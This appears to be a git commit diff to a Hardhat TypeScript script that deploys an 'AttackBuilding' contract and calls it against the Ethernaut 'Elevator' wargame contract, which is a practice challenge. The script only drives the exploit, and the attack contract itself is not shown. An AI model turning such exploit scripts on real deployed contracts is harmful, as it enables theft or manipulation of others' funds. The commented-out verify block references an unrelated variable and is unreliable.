7d3ff2cdeee27b9bdcb5740db2a3e6644be30647
Crys <mariano.christopher123@gmail.com>
2023-01-01 12:36:12 +0800

    optimize elevator level

--- scripts/attackBuilding.ts
+++ scripts/attackBuilding.ts
@@ -3,12 +3,41 @@ import { ethers } from "hardhat";
 const attackBuilding = async () => {
     // change contract addresses here.
     const buildingAddress = "0x5d4D6D9b06CFb497D559355429AA7f9dd351AB62"; //type "await contract.address()" in ethernaut console
-    // AttackBuilding address = " 0x853d1DDfF381089F6C479B76819B3C7d143D9544";
+    const args: [] = [];
+    const deployer = process.env.PRIVATE_KEY || "";
+    // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
     // Can alter last floor by using another contract
     // Additional read about interface:
     // https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces
+
+    // deploying attack contract here
+    // const deployed = await deployContract(hre, "AttackBuilding", args);
+    // alternative below
+    console.log("Deploying attack contract AttackBuilding...");
+    const Factory = await ethers.getContractFactory("AttackBuilding", deployer);
+    const attackBuilding = await Factory.deploy();
+    console.log(attackBuilding);
+    console.log(`Contract deployed to ${attackBuilding.address}`);
+    console.log("Attack contract deployed...");
+    // experimantal verify below
+    // if (attackBuilding.address){
+    //     console.log("Verifying contract...");
+    //     try {
+    //         await run("verify:verify", {
+    //             address: eternalKing.address,
+    //             constructorArguments: args,
+    //         });
+    //     } catch (e: any) {
+    //         if (e.message.toLowerCase().includes("already verified")) {
+    //             console.log("Already verified!");
+    //         } else {
+    //             console.log(e);
+    //         }
+    //     }
+    // }
+
     // typing all commands in console below
     // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
     const ABI = [
@@ -20,7 +49,7 @@ const attackBuilding = async () => {
             type: "function",
         },
     ];
-    const attack = await ethers.getContract("AttackBuilding");
+    const attack = await ethers.getContractAt("AttackBuilding", attackBuilding.address);
     const contract = await ethers.getContractAt(ABI, buildingAddress);
     console.log("Making it possible to go to top floor...");
     const tx1 = await attack.isLastFloor();
